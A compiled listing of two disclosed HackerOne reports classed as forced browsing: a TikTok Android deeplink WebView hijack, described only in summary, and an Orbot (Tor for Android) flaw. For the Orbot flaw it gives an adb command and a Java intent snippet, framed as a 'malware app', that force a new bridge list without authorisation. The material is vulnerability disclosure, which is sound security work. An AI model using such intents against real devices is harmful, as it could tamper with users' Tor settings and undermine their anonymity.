# Forced Browsing

_2 reports — High/Critical, disclosed_

### [One Click Account Hijacking via Unvalidated Deeplink](https://hackerone.com/reports/1500614)

- **Report ID:** `1500614`
- **Severity:** High
- **Weakness:** Forced Browsing
- **Program:** TikTok
- **Reporter:** @fr4via
- **Bounty:** - usd
- **Disclosed:** 2022-05-04T22:23:33.298Z
- **CVE(s):** -

**Summary (team):**

A WebView Hijacking vulnerability was found on the TikTok Android application via an un-validated deeplink on an un-sanitized parameter. This could have resulted in account hijacking through a JavaScript interface. We thank @fr4via for reporting this to our team.

---

### [[Android org.torproject.android] Possible to force list of bridges](https://hackerone.com/reports/252626)

- **Report ID:** `252626`
- **Severity:** High
- **Weakness:** Forced Browsing
- **Program:** Tor
- **Reporter:** @bagipro
- **Bounty:** - usd
- **Disclosed:** 2017-08-21T19:11:41.303Z
- **CVE(s):** -

**Vulnerability Information:**

Do the following thing from ADB to emulate the activity start:
```
adb am start -n org.torproject.android/.OrbotMainActivity -a android.intent.action.VIEW -d bridge://xxx
```

Or create a malware app with the following code:
```java
        Intent intent = new Intent("android.intent.action.VIEW");
        intent.setClassName("org.torproject.android", "org.torproject.android.OrbotMainActivity");
        intent.setData(Uri.parse("bridge://xxx"));
        startActivity(intent);
```

And new list of bridges will be applied (notification will be shown and new value will be added to shared_prefs).

It's dangerous because any not authorized app (third party app) installed on the same device will be able to modify settings. On the newest Android devices this not authozed change can be done remotely from any web-browser using Instant Apps (app that doesn't require install to execute any code).

---
